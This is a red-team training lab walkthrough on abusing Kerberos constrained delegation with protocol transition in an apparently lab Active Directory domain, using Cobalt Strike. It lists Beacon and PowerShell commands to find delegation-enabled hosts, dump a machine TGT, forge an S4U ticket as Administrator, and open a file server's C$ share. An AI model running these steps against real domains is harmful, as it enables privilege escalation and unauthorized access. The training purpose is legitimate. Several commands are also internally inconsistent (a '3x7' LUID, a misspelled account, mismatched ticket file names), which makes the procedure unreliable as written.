# Constrained Delegation (with protocol transition) Lab

>The objective of this lab is to abuse constrained delegation with protocol transition to obtain access to a back-end service.

===

## Enumeration

1. Launch Cobalt Strike and connect to the team server.
2. Search for computers whose *msDS-AllowedToDelegateTo* attribute is not null.
  
    ```Beacon-nocolor
    ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl
    ```

⚠️ This should return *lon-ws-1$*, which is permitted to delegate to *cifs/lon-fs-1*.

3. Use PowerShell to check that the **TRUSTED_TO_AUTH_FOR_DELEGATION** flag is set.

    ```Terminal-nocolor
    [Convert]::ToBoolean(16781312 -band 16777216)
    ```

⚠️ This should return *True*.

4. Move laterally to *lon-ws-1*.

⚠️ steps to [lateral movement - impersonate user](/labs/User-Impersonation-lab.md)  

===

## Exploitation

1. Dump the TGT for *lon-ws-1* computer and observe the hex LUID is `3x7`  

    ```Beacon-nocolor
    krb_triage
    krb_dump /luid:3e7 /service:krbtgt
    ```

2. Perform the S4U abuse to obtain a usable service ticket for *cifs/lon-fs-1*, impersonating the default domain admin.
  
    ```Beacon-nocolor
    krb_s4u /ticket:[TGT] /service:cifs/lon-fs-1 /impersonateuser:Administrator
    
    krb_describe /ticket:[base64]
    ```

3. Use the ticket to access the C$ share on *lon-fs-1*.

>Combination of beacon and powershell commands: 

```
make_token CONTOSO\Administraotr FAKEPass!

[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String("[B64 TICKET]"))

kerberos_ticket_use C:\Users\Attacker\Desktop\cifs-con-fs-1.kirbi
ls \\lon-fs-1\c$
```
⚠️ steps to [lateral movement - impersonate user](/labs/User-Impersonation-lab.md)  

⚠️ In this lab, you have learned how to abuse constrained delegation (with protocol transition) to impersonate any user to the delegated service.
